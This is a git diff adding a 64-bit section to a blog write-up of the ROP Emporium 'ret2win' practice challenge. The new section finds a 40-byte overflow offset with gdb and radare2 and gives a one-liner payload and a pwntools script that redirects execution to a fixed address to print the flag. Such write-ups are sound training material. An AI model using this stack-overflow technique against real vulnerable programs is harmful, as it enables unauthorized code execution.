@@ -14,6 +14,7 @@ image: ret2win.png
 2. [Analysis](#analysis)
 3. [Plan](#plan)
 4. [Solution](#solution)
+4. [64bit](#64bit)
 
 
 ##  Introduction
@@ -72,6 +73,7 @@ And this is my final python script to exploit it.
 <img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/flag.PNG">
 
 ##  Solution
+##  32bit
 
 ```python
 
@@ -95,8 +97,79 @@ p.interactive()
 
 ```
 
+## 64bit
 
+The challenge provides us with the 64bit binary.
 
-## END
+---
+### ROP-Emporium: ret2win64
+
+_Files:_ `ret2win`
+
 ---
 
+### Analysis
+
+Lets take a look at the properties of the binary.
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/checksec.PNG">
+
+Using radare2 to analyze all referenced code.
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64//r2_aaaa_afl.PNG">
+
+Print the disassembly of the ret2win() function.
+NOTE* `0x00400815` This looks very interesting and a potential address that can be used if the registers can be controlled. 
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/r2_pdf_ret2win.PNG">
+
+Creating a pattern of 100 characters to use to locate the segmentation fault
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/gdb_pattern_create.PNG">
+
+Segmentation fault occured but this time RSP is holding 'AA0AAFAAb'. The offset is located at 40 bytes. 
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/gdb_seg_fault_offset.PNG">
+
+### PLAN:
+
+Same plan as the 32bit binary. Just input the address I noted `0x00400815` when disassembling the ret2win() function in `Image#3` above. 
+
+```python
+python -c 'print "A"*40+"\x15\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
+```
+Nice! It worked. 
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/flag_1_line.PNG">
+
+And this is my final python script to exploit it.
+
+<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/flag.PNG">
+
+```python
+
+#!/usr/bin/python
+from pwn import *
+
+# 0x00400815 mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:"
+
+binary_path = './ret2win'
+e = ELF(binary_path)
+p = process(binary_path)
+
+buf = "A" * 40
+
+buf += p64(0x00400815)
+
+print(p.recvuntil('!\n'))
+p.sendline(buf)
+p.interactive()
+
+
+
+```
+
+
+
+### END
+---
